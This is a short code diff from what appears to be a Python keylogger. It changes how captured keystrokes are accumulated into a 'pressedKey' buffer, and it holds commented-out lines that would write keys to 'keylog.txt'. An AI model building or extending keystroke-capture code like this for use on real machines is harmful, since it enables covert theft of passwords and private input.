@@ -63,11 +63,13 @@ def run(**args):
 				#logger = open("keylog.txt", "a")
 				if candidate == 28:  # handle enter
 					sys.stdout.write("\n")
-					pressedKey.append("\n")
+					pressedKey +='\n'
+					#pressedKey.append("\n")
 					#logger.write("\n")
 				else:
 					sys.stdout.write(KEYS[kbl][candidate])
-					pressedKey.append(KEYS[kbl][candidate])
+					#pressedKey.append(KEYS[kbl][candidate])
+					pressedKey +=KEYS[kbl][candidate]
 					#logger.write(KEYS[kbl][candidate])
 				# flush output (do not wait until we get a newline to print)
 				sys.stdout.flush()
